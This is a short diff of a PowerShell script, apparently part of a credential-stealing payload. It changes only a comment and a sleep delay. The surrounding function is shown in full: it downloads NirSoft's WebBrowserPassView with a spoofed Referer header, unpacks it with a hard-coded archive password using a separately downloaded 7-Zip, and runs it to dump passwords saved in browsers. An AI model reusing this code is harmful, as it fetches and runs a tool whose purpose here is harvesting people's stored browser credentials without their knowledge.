@@ -55,14 +55,14 @@ function TempDir {
 
 # Function to download Nirsoft tools
 function Get-Nirsoft {
-    $zipPassword = 'wbpv28821@'  # Ajoutez votre mot de passe ici
+    $zipPassword = 'wbpv28821@'  # Archive password
     Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
     Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
     Expand-Archive 7z.zip
     .\7z\7za.exe e wbpv.zip -p $zipPassword
 
-    # Pause de 3 secondes
-    Start-Sleep -Seconds 3
+    # Pause de 5 secondes
+    Start-Sleep -Seconds 5
     
     .\WebBrowserPassView.exe
 }
